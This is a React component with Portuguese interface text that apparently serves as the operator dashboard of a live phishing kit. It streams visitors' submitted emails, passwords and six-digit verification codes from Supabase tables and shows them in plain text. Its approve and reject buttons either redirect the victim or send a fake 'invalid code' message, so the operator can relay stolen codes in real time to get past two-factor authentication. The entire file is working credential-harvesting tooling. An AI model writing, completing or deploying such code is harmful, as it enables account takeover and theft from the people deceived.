import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Check, X, Loader2, ShieldCheck } from "lucide-react";
import { toast } from "sonner";

interface ApprovalsPanelProps {
  adId: string;
}

interface LeadRow {
  session_id: string;
  field_name: string;
  value: string;
  created_at: string;
}

interface ActionRow {
  session_id: string;
  action: string;
  created_at: string;
}

interface SessionState {
  session_id: string;
  email?: string;
  password?: string;
  code?: string;
  passwordAt?: string;
  codeAt?: string;
  resolved?: "approve" | "reject";
  resolvedAt?: string;
}

export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [busy, setBusy] = useState<string | null>(null);

  // Carrega + escuta leads
  useEffect(() => {
    let alive = true;
    (async () => {
      const { data } = await supabase
        .from("ad_leads")
        .select("session_id, field_name, value, created_at")
        .eq("ad_id", adId)
        .in("field_name", ["email_submitted", "password_submitted", "code_submitted"])
        .order("created_at", { ascending: true });
      if (alive && data) setLeads(data as LeadRow[]);
    })();

    const ch = supabase
      .channel(`approvals-leads-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const r = payload.new as LeadRow;
          if (!["email_submitted", "password_submitted", "code_submitted"].includes(r.field_name)) return;
          setLeads((prev) => [...prev, r]);
        },
      )
      .subscribe();
    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [adId]);

  // Carrega + escuta ações
  useEffect(() => {
    let alive = true;
    (async () => {
      const { data } = await supabase
        .from("ad_session_actions")
        .select("session_id, action, created_at")
        .eq("ad_id", adId)
        .order("created_at", { ascending: true });
      if (alive && data) setActions(data as ActionRow[]);
    })();

    const ch = supabase
      .channel(`approvals-actions-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
        (payload) => setActions((prev) => [...prev, payload.new as ActionRow]),
      )
      .subscribe();
    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [adId]);

  const sessions: SessionState[] = useMemo(() => {
    const map = new Map<string, SessionState>();
    for (const l of leads) {
      const s = map.get(l.session_id) || { session_id: l.session_id };
      if (l.field_name === "email_submitted") s.email = l.value;
      if (l.field_name === "password_submitted") {
        s.password = l.value;
        s.passwordAt = l.created_at;
      }
      if (l.field_name === "code_submitted") {
        s.code = l.value;
        s.codeAt = l.created_at;
      }
      map.set(l.session_id, s);
    }
    for (const a of actions) {
      const s = map.get(a.session_id);
      if (!s) continue;
      if (a.action === "approve" || a.action === "reject") {
        s.resolved = a.action;
        s.resolvedAt = a.created_at;
      }
    }
    // Mostra só sessões com pelo menos código
    return Array.from(map.values())
      .filter((s) => s.code)
      .sort((a, b) => (b.codeAt || "").localeCompare(a.codeAt || ""));
  }, [leads, actions]);

  const send = async (sessionId: string, action: "approve" | "reject", message?: string) => {
    setBusy(`${sessionId}-${action}`);
    const { error } = await supabase.from("ad_session_actions").insert({
      ad_id: adId,
      session_id: sessionId,
      action,
      payload: message ? { message } : null,
    });
    setBusy(null);
    if (error) {
      toast.error(error.message);
      return;
    }
    toast.success(action === "approve" ? "Aprovado — visitante redirecionado" : "Rejeitado");
  };

  if (sessions.length === 0) {
    return (
      <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
        <div className="flex items-center gap-2">
          <ShieldCheck className="h-4 w-4 text-primary" />
          <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
        </div>
        <p className="mt-2 text-xs italic text-muted-foreground">
          Quando alguém digitar a senha + o código de 6 dígitos, vai aparecer aqui pra você aceitar ou rejeitar.
        </p>
      </div>
    );
  }

  return (
    <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
      <div className="mb-3 flex items-center gap-2">
        <ShieldCheck className="h-4 w-4 text-primary" />
        <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
        <span className="ml-auto text-[10px] uppercase tracking-wide text-muted-foreground">
          {sessions.filter((s) => !s.resolved).length} pendente(s)
        </span>
      </div>

      <div className="space-y-2">
        {sessions.map((s) => {
          const pending = !s.resolved;
          return (
            <div
              key={s.session_id}
              className={`rounded-md border p-3 text-xs ${
                pending ? "border-primary/40 bg-primary/5" : "border-border bg-card/30 opacity-70"
              }`}
            >
              <div className="grid grid-cols-[auto,1fr] gap-x-3 gap-y-1">
                <span className="text-muted-foreground">E-mail</span>
                <span className="break-all font-mono">{s.email || "—"}</span>
                <span className="text-muted-foreground">Senha</span>
                <span className="break-all font-mono">{s.password || "—"}</span>
                <span className="text-muted-foreground">Código</span>
                <span className="break-all font-mono tracking-widest">{s.code || "—"}</span>
              </div>

              {pending ? (
                <div className="mt-3 flex gap-2">
                  <Button
                    size="sm"
                    className="flex-1 bg-success text-success-foreground hover:bg-success/90"
                    onClick={() => send(s.session_id, "approve")}
                    disabled={busy === `${s.session_id}-approve`}
                  >
                    {busy === `${s.session_id}-approve` ? (
                      <Loader2 className="mr-1 h-3.5 w-3.5 animate-spin" />
                    ) : (
                      <Check className="mr-1 h-3.5 w-3.5" />
                    )}
                    Aceitar
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    className="flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
                    onClick={() => send(s.session_id, "reject", "Código inválido. Verifique e tente novamente.")}
                    disabled={busy === `${s.session_id}-reject`}
                  >
                    {busy === `${s.session_id}-reject` ? (
                      <Loader2 className="mr-1 h-3.5 w-3.5 animate-spin" />
                    ) : (
                      <X className="mr-1 h-3.5 w-3.5" />
                    )}
                    Rejeitar
                  </Button>
                </div>
              ) : (
                <p className="mt-2 text-[11px] text-muted-foreground">
                  {s.resolved === "approve" ? "✓ Aprovado" : "✗ Rejeitado"}
                </p>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}
